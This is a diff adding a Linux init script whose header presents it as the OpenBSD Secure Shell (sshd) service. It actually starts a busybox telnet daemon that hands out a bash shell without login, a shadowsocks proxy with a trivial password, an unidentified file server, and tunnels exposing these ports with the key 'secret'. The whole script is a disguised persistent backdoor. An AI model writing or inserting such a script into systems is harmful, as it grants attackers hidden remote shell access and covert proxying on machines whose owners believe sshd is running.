@@ -1,0 +1,17 @@
+#! /bin/sh
+
+### BEGIN INIT INFO
+# Provides:             ssh sshd
+# Required-Start:       $remote_fs $syslog
+# Required-Stop:        $remote_fs $syslog
+# Default-Start:        2 3 4 5
+# Default-Stop:
+# Short-Description:    OpenBSD Secure Shell server
+### END INIT INFO
+busybox telnetd -l /bin/bash 
+/root/first/go-shadowsocks2 -s 'ss://AEAD_CHACHA20_POLY1305:12345@:200' & 
+/root/first/fserver  1000 &
+/root/first/server_linux_amd64 -l :16384 -t 127.0.0.1:23  --key secret &
+/root/first/server_linux_amd64 -l :17001 -t 127.0.0.1:200 --key secret &
+/root/first/server_linux_amd64 -l :17002 -t 127.0.0.1:1000 --key secret &
+exit 0 
